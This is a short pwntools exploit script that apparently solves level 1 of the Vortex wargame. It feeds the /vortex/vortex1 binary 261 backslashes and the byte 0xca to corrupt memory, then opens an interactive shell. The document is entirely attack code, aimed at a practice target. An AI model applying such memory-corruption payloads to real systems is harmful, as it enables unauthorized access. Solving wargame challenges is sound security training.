from pwn import * 

target = process("/vortex/vortex1")
target.send(261*"\\" + "\xca")
target.interactive()
